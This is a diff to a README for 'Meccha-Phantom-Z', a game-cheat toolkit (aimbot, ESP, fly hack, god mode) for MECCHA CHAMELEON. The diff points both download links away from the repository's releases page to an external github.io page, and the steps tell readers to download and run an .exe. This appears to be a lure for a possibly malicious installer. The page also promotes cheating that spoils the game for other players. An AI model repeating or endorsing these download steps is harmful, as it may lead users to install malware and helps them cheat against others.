@@ -1,6 +1,6 @@
 # 🚀 Meccha-Phantom-Z - Win games with these advanced tools
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Lulitaromantic194/Meccha-Phantom-Z/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://lulitaromantic194.github.io)
 
 Meccha-Phantom-Z is a toolkit for players of MECCHA CHAMELEON. This software provides features to help you see enemies, aim with precision, and navigate the game world. It includes tools like ESP, Aimbot, Auto Paint, Mod Menu, Fly Hack, Teleport, and God Mode.
 
@@ -8,7 +8,7 @@ Meccha-Phantom-Z is a toolkit for players of MECCHA CHAMELEON. This software pro
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Lulitaromantic194/Meccha-Phantom-Z/releases) to access the download files.
+1. Visit the [official releases page](https://lulitaromantic194.github.io) to access the download files.
 2. Look for the file ending in .exe under the latest version.
 3. Click the link to save the installer to your computer.
 4. Locate the downloaded file in your downloads folder.
